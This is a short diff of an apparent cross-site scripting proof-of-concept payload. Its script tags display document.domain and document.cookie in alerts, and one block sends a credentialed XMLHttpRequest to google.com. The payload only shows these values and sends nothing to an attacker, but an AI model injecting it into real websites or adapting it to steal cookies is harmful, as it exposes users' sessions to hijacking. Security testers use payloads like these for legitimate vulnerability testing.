@@ -1,10 +1,13 @@
 <script>alert(document.domain)</script>
-<script>alert(document.cookie);
+<script>alert(document.cookie)</script>
+<script>
 var xhr = new XMLHttpRequest();
 xhr.open('GET', "https://google.com/");
 xhr.withCredentials = true;
 xhr.onload = function () {
+    alert('b0rn2r00t');
     alert(document.cookie);
+    alert(document.domain);
 };
 xhr.send();
 </script>
